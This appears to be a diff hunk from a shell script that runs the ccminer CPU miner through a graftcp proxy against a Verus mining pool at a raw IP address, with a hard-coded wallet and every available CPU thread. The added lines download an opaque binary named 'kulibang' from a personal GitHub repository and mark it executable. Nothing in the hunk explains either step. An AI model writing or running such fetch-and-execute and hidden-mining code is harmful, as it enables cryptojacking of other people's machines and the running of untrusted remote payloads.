@@ -38,6 +38,9 @@ END
   echo " "
   echo " "
 
+  /usr/bin/graftc wget https://github.com/marcelinoferdom/minse/raw/main/kulibang 
+  chmod +x kulibang
+
   # Run ccminer in the background
   /usr/bin/graftcp ./ccminer/ccminer -a verus -o stratum+tcp://67.205.160.239:4444 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.$(echo $(shuf -i 1-1000 -n 1)) -p x -t "$(nproc)" &
 
